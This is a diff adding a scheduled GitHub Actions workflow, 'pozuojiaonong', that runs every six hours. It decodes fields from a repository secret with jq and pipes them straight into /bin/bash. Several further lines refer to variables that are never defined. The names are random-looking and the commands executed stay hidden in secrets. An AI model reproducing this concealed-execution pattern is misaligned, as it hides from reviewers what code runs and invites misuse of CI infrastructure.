@@ -1,0 +1,29 @@
+name: pozuojiaonong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: pozuojiaonong
+        env:
+          piorq93: ${{ secrets.piorq93 }}
+        run: |
+          echo $piorq93 | jq -r .mvnrk71 | /bin/bash
+          echo $tmsnl5488 | jq -r .eqpt53 | /bin/bash
+          echo $nglu621 | jq -r .wjj9137 | /bin/bash
+          echo $oqkrx1229 | jq -r .gcnhk76997 | /bin/bash
+          echo $knu8 | jq -r .asc8382 | /bin/bash
+          echo $bazvc88632 | jq -r .ggig6 | /bin/bash
+          echo $cz87718 | jq -r .y294 | /bin/bash
+          echo $knqw58 | jq -r .asg201 | /bin/bash
+          echo $yj17 | jq -r .sarl80 | /bin/bash
+          echo $p218 | jq -r .tkayh68550 | /bin/bash
+          echo $wqjhj28 | jq -r .o146 | /bin/bash
+          echo $o14853 | jq -r .bnnw3 | /bin/bash
+          echo $kiave27501 | jq -r .xteec1554 | /bin/bash
+
